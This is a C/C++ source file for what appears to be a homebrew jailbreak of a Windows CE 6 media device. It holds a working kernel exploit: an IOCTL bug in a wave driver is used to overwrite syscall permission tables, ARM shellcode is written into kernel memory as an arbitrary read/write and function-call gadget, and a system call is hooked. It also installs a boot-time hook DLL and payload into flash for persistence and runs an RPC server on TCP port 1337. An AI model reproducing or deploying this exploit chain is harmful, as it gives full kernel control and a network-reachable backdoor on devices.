#include "nativeapp_common.h"
#include "kernel_helpers.h"
#include "rpc_server.h"
#include "install_ui.h"

wchar_t foo[256];
bool dead = false;
zunecom_CommandResp resp = zunecom_CommandResp_init_zero;

int hax() {
	DWORD o = 0;
	BOOL b = false;
	HANDLE h;
	DWORD outsz = 0;


	/* Step 1: Use bug in libnmvwavedev.dll to write controled value over the syscall parameter validation table */
	h = CreateFileW(L"WAV1:", GENERIC_READ, 0, 0,3, 0x80, 0);
	#pragma pack(push,1)
		struct Input{
		int ptr_idx;
		int subcmd;
		int a;
		int b;
		int c;
	};
	#pragma pack(pop)

	DWORD get_exit_code_thread_ptr = 0x80061408;

	struct Input* inbuf = (struct Input*)calloc(sizeof(Input), 1);
	void* outb = calloc(1024, 1);
	inbuf->subcmd = 0x13; // 7 => |= 2, 8 => unset bit 2
	inbuf->a = get_exit_code_thread_ptr - 0x178; // addr of perms for GetExitCodeThread - offset
	inbuf->b = 0; // tgt value

	b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	if(b == 0) {
		DWORD err = GetLastError();
		std::swprintf(foo, L"bad ioctl: %x", err);
		ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
		return 0;
	}
	free(inbuf);

	/* We can now use kernel pointers as outputs for GetExitCodeThread */

	/* Step 2: Create a arb r/w gadget */
	DWORD base = 0x80015020;

	/*
ldr r3, =0x1337
cmp r2, r3
bne not_store
strb r1, [r0]
b ret
not_store:
add r3, #1
cmp r2, r3
bne err
ldrb r0, [r0]
ret:
bx lr

err:
ldr r0, =0x80072360
bx r0


\x28\x30\x9f\xe5
\x03\x00\x52\xe1
\x01\x00\x00\x1a
\x00\x10\xc0\xe5

\x03\x00\x00\xea
\x01\x30\x83\xe2
\x03\x00\x52\xe1
\x01\x00\x00\x1a

\x00\x00\xd0\xe5
\x1e\xff\x2f\xe1
\x04\x00\x9f\xe5
\x10\xff\x2f\xe1

\x37\x13\x00\x00
\x60\x23\x07\x80"

	*/
	kwr(base+0x00, 0xe59f3028);
    kwr(base+0x04, 0xe1520003);
	kwr(base+0x08, 0x1a000001);
	kwr(base+0x0c, 0xe5c01000);

	kwr(base+0x10, 0xea000003);
	kwr(base+0x14, 0xe2833001);
	kwr(base+0x18, 0xe1520003);
	kwr(base+0x1c, 0x1a000001);

	kwr(base+0x20, 0xe5d00000);
	kwr(base+0x24, 0xe12fff1e);
	kwr(base+0x28, 0xe59f0004);
	kwr(base+0x2c, 0xe12fff10);

	kwr(base+0x30, 0x00001337);
	kwr(base+0x34, 0x80072360);

	/* Step 2b: extend trampoline with magic 0x1339 = call_kernel_function(struct).
	   Layout: caller passes struct {fn_ptr, arg0, arg1, arg2, arg3}; kernel-side
	   loads the 5 fields, calls fn_ptr(arg0..arg3), returns r0.

	   Patch bne at base+0x1c from "+1 (jump to err at base+0x28)" to "+7 (jump
	   to extended check at base+0x40)". Existing 0x1337/0x1338 paths unchanged.

	   Caller passes struct {fn_ptr, arg0..arg5}; trampoline loads arg0..arg3
	   into r0..r3 and pushes arg4 + arg5 onto stack at sp+0 / sp+4 so 6-arg
	   functions like VirtualCopyEx work.

	   Layout at base+0x40+ (17 instructions, ends at base+0x7F):
	     0x40: add r3, r3, #1            ; r3 = 0x1339
	     0x44: cmp r2, r3
	     0x48: bne base+0x28 (err)
	     0x4c: push {r4, lr}
	     0x50: ldr r4, [r0, #0]          ; fn_ptr
	     0x54: ldr r1, [r0, #24]         ; arg5
	     0x58: push {r1}                  ; sp+4 = arg5
	     0x5c: ldr r1, [r0, #20]         ; arg4
	     0x60: push {r1}                  ; sp+0 = arg4
	     0x64: ldr r1, [r0, #8]          ; arg1
	     0x68: ldr r2, [r0, #12]         ; arg2
	     0x6c: ldr r3, [r0, #16]         ; arg3
	     0x70: ldr r0, [r0, #4]          ; arg0
	     0x74: blx r4
	     0x78: add sp, sp, #8            ; pop both stacked args
	     0x7c: pop {r4, pc}
	*/
	kwr(base+0x1c, 0x1a000007);   // bne base+0x40 (extended dispatch)
	kwr(base+0x40, 0xe2833001);   // add r3, r3, #1   ; 0x1339
	kwr(base+0x44, 0xe1520003);   // cmp r2, r3
	kwr(base+0x48, 0x1afffff6);   // bne base+0x28 (err) - 0x1339 is the last magic
	kwr(base+0x4c, 0xe92d4010);   // push {r4, lr}
	kwr(base+0x50, 0xe5904000);   // ldr r4, [r0, #0]    ; fn_ptr
	kwr(base+0x54, 0xe5901018);   // ldr r1, [r0, #24]   ; arg5
	kwr(base+0x58, 0xe52d1004);   // push {r1}            ; sp+4
	kwr(base+0x5c, 0xe5901014);   // ldr r1, [r0, #20]   ; arg4
	kwr(base+0x60, 0xe52d1004);   // push {r1}            ; sp+0
	kwr(base+0x64, 0xe5901008);   // ldr r1, [r0, #8]    ; arg1
	kwr(base+0x68, 0xe590200c);   // ldr r2, [r0, #12]   ; arg2
	kwr(base+0x6c, 0xe5903010);   // ldr r3, [r0, #16]   ; arg3
	kwr(base+0x70, 0xe5900004);   // ldr r0, [r0, #4]    ; arg0
	kwr(base+0x74, 0xe12fff34);   // blx r4
	kwr(base+0x78, 0xe28dd008);   // add sp, sp, #8
	kwr(base+0x7c, 0xe8bd8010);   // pop {r4, pc}

	/* Step 3: make getfsheapinfo into the arb r/w gadget we just planted.
	   CE 6 routes coredll!GetFSHeapInfo through two syscall vtables (one
	   for trusted callers, one for untrusted) so patch both. Without the
	   untrusted-table patch, plugins loaded into device.exe / gemstone UI
	   can't reach kerncore; the gadget intercepts only trusted-context
	   calls and untrusted calls land at the real (returns-0) impl. */
	kwr(0x80060da0, base);
	kwr(0x80060fa8, base);

	// Plant the cross-process helpers (HELPER_V3/V4/V7 + TLB_FLUSH) in
	// kernel scratch via the now-active gadget. zuxhook in gemstone uses
	// them directly through kerncore, with no IPC. Idempotent.
	kerncore_plant_helpers();

	// Serve RPC (TCP 1337) on a worker thread and block for the process
	// lifetime; the zuxhook watchdog respawns us if this thread ever exits.
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, Server, NULL, 0, &dwThreadId);
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}

// ── Install mode ─────────────────────────────────────────────────────────
// When the exploiter launches nativeapp from the title's Content dir, its only
// job is to copy the Lyra payload into \flash2\automation (the directory the
// platform loads zuxhook.dll from at boot) and reboot. The daemon runs
// separately, spawned by the zuxhook watchdog from \flash2\automation after boot.
// Copying needs no kernel exploit; it is plain flash IO.

static const wchar_t* kContentDir = L"\\gametitle\\584E07D1\\Content";
static const wchar_t* kAutomationDir = L"\\flash2\\automation";

// Copy one payload file from Content into \flash2\automation. A loaded
// destination image (zuxhook.dll or nativeapp.exe on an already-hooked device)
// can be renamed but not overwritten, so on a sharing violation rename it aside
// and copy into the freed name.
static void install_file(LPCWSTR rel) {
	wchar_t src[MAX_PATH], dst[MAX_PATH], aside[MAX_PATH];
	_snwprintf(src,   MAX_PATH - 1, L"%s\\%s", kContentDir, rel);
	_snwprintf(dst,   MAX_PATH - 1, L"%s\\%s", kAutomationDir, rel);
	_snwprintf(aside, MAX_PATH - 1, L"%s\\%s.old", kAutomationDir, rel);

	if (CopyFileW(src, dst, FALSE)) {
		return;
	}
	DWORD err = GetLastError();
	if (err != ERROR_SHARING_VIOLATION && err != ERROR_ACCESS_DENIED) {
		return;
	}
	DeleteFileW(aside);
	if (MoveFileW(dst, aside)) {
		CopyFileW(src, dst, FALSE);
	}
}

// Recursively mirror a Content subtree (the mods dir) into \flash2\automation,
// creating directories as it descends.
static void install_tree(LPCWSTR rel) {
	wchar_t src_dir[MAX_PATH], dst_dir[MAX_PATH], glob[MAX_PATH];
	_snwprintf(src_dir, MAX_PATH - 1, L"%s\\%s", kContentDir, rel);
	_snwprintf(dst_dir, MAX_PATH - 1, L"%s\\%s", kAutomationDir, rel);
	_snwprintf(glob,    MAX_PATH - 1, L"%s\\*", src_dir);

	CreateDirectoryW(dst_dir, NULL);

	WIN32_FIND_DATAW fd;
	HANDLE h = FindFirstFileW(glob, &fd);
	if (h == INVALID_HANDLE_VALUE) {
		return;
	}
	do {
		if (fd.cFileName[0] == L'.' &&
		    (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0))) {
			continue;
		}
		wchar_t child[MAX_PATH];
		_snwprintf(child, MAX_PATH - 1, L"%s\\%s", rel, fd.cFileName);
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			install_tree(child);
		} else {
			install_file(child);
		}
	} while (FindNextFileW(h, &fd));
	FindClose(h);
}

// Each step is near-instant flash IO; hold a floor so the splash reads as a
// sequence, not a flicker. One-time install, so the pad is free.
static const DWORD kStageFloorMs = 550;

static void hold(DWORD since) {
	DWORD elapsed = GetTickCount() - since;
	if (elapsed < kStageFloorMs) Sleep(kStageFloorMs - elapsed);
}

// Worker thread: does the copy and publishes each step. No GL here; the render
// loop owns the surface.
static void install_work() {
	DWORD t;
	t = GetTickCount(); set_install_stage(STAGE_PREPARE);
	CreateDirectoryW(kAutomationDir, NULL);                       hold(t);
	t = GetTickCount(); set_install_stage(STAGE_LOADER);
	install_file(L"zuxhook.dll");                                 hold(t);
	t = GetTickCount(); set_install_stage(STAGE_DAEMON);
	install_file(L"nativeapp.exe");                               hold(t);
	install_file(L"lyra.json");                                   hold(t);
	t = GetTickCount(); set_install_stage(STAGE_MODS);
	install_tree(L"platform");                                    hold(t);
	install_tree(L"mods");                                        hold(t);
	set_install_stage(STAGE_DONE);
}

static void install() {
	run_install_ui(install_work);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd) {
	wchar_t self[MAX_PATH];
	GetModuleFileNameW(NULL, self, MAX_PATH);
	for (wchar_t* p = self; *p; ++p) {
		if (*p >= L'A' && *p <= L'Z') *p += 32;
	}

	// Exploiter-launched from the title's Content dir: install, then reboot (the
	// splash reboots on completion, so install() does not return). The daemon
	// comes up when the zuxhook watchdog spawns us from \flash2\automation.
	if (wcsstr(self, L"\\gametitle\\") != NULL) {
		install();
		return 0;
	}

	// Watchdog-launched from \flash2\automation: run the daemon. Self-singleton
	// so only one runs at a time; the zuxhook watchdog opens this mutex to detect
	// whether one is already alive.
	HANDLE g_self_mutex = CreateMutexW(NULL, TRUE, L"zune-nativeapp-self");
	if (g_self_mutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
		if (g_self_mutex != NULL) CloseHandle(g_self_mutex);
		return 0;
	}

	SuppressReboot();
	hax();
	return 0;
}
